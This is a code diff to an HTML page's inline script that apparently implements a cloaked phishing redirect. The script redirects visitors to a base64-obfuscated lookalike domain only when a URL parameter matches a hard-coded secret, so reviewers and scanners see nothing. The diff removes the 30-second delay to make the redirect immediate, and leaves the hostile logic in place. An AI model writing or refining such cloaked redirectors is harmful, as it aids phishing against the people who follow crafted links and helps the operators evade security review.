@@ -18,7 +18,6 @@
       var SECRET = "l8ESu77ZzXsRzSnootPixqJusBN1";
       var PARAM = "k";
       var ENCODED_TARGET = "aHR0cHM6Ly9wcm8tZm90b2Nhc2Euc3U5OTgyLmNjLw==";
-      var REDIRECT_DELAY_MS = 30000; // 3 seconds
 
       function decodeBase64(str) {
         try { return atob(str); } catch (_) { return ""; }
@@ -27,16 +26,13 @@
       var params = new URLSearchParams(window.location.search);
       var value = params.get(PARAM);
 
-     
-    if (value && value === SECRET) {
-      var target = decodeBase64(ENCODED_TARGET);
-      if (target) {
-        setTimeout(function () {
+      if (value && value === SECRET) {
+        var target = decodeBase64(ENCODED_TARGET);
+        if (target) {
           window.location.replace(target);
-        }, REDIRECT_DELAY_MS);
+        }
       }
-    }
-  })();
+    })();
   </script>
 </body>
 </html>
